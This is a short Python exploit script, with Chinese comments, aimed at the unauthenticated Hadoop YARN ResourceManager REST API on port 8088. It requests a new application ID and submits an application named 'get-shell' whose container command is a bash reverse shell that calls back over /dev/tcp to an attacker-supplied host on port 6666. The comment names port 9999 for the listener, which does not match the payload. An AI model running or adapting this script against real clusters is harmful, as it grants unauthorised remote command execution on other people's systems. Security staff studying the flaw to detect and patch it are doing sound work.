import requests
 
"""
Hadoop是一个由Apache基金会所开发的分布式系统基础架构
YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度
可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。
简单的说，用户可以向YARN提交特定应用程序进行执行，其中就允许执行相关包含系统命令。
yarn默认开发8088和8089端口。

https://xz.aliyun.com/t/8512

curl -X POST ip:8088/ws/v1/cluster/apps/new-application
"""
target = 'http://ip:8088/'
lhost = 'vps'  # put your local host ip here, and listen at port 9999
 
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
print(resp.text)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/6666 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
print(data)
requests.post(url, json=data)
